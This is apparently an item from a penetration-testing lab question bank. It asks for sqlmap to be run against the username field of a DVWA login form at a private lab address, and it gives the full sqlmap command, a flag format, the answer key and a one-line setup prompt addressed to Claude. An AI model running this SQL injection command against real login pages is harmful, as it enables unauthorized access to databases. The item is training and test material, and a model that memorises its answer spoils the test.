# Q257 — SQLMap on POST Request

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Use sqlmap on a POST request to DVWA login page. Test the `username` parameter for SQL injection using the `--data` flag."

---

## 🎯 Flag Format

```
method=<POST|GET>; vulnerable_param=<name>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/login.php" --data="username=admin&password=test&Login=Login" -p username --batch
```

**Answer:** `method=POST; vulnerable_param=username`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q257"
